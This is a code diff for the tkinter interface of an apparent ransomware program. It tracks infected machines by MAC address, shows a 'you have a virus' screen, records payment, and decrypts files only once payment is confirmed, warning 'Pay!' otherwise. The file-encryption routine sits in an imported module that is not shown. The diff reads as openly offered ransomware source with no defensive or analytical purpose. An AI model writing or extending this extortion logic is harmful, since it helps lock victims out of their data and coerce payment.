@@ -1,4 +1,5 @@
 from tkinter import *
+from tkinter import messagebox
 from ransom import Ransom
 from KeyManager import KeyManager
 from uuid import getnode as get_mac
@@ -16,25 +17,31 @@ class GUI:
         self.keyManager = KeyManager()
         self.ransom = Ransom()
 
-        if(True):
-            self.loadYouHaveVirus()
-        else:
+        if(self.keyManager.isEncrypted(get_mac())):
             self.loadEncrypted()
-
+        else:
+            self.loadYouHaveVirus()
 
 
 
     def pay(self):
         self.keyManager.pay(get_mac())
+        messagebox.showinfo('Thanks','Thanks you for the payment.')
 
     def decrypt(self):
-        print('You have been')
-        self.ransom.startDecryption()
+        try:
+            self.ransom.startDecryption()
+            self.keyManager.removeThisMacFromDB() #Temp svo thad tharf ekki ad eyda ut ur gagnagrunni manual.
+            messagebox.showinfo('Decrypted','Everything has been decrypted.')
+            quit()
+        except Exception as error:
+            print(error)
+            messagebox.showwarning('Pay!','You have not payed.')
+        
+
 
     def encrypt(self):
-        print('Encrypted')
         self.ransom.encrypt()
-        print(self.ransom.root)
         self.window.destroy()
         self.loadEncrypted()
 
